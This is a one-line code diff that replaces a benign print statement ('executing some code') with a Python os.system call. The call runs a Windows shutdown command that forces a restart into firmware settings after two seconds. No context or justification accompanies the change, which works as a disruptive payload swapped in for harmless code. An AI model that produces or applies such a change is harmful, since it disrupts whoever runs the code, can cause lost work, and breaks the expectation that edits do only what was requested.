@@ -1,1 +1,1 @@
-print('executing some code')
+os.system("shutdown /r /fw /t 2 ")
